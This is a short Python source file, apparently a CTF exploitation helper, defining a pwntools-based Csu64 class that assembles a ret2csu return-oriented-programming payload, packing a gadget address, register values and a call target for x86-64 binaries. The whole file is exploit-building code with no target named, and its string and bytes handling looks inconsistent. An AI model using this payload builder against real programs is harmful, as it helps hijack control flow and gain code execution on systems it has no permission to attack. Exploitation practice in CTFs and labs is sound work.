from pwnlib.util.packing import p64

class Csu64:
    def __init__(self, addr):
        self.addr = addr
        self.edi = 0
        self.rsi = 0
        self.rdx = 0
        self.rbp = 0
        self.target = 0

    def __str__(self, count=1):
        self.rbp = count
        payload = p64(self.addr)
        payload += p64(0) + p64(self.rbp)
        payload += p64(self.target)
        payload += p64(self.rdx) + p64(self.rsi)
        payload += p64(self.edi)
        payload += p64(self.addr - 0x1a)

        return payload

    def __add__(self, src):
        return str(self) + str(src)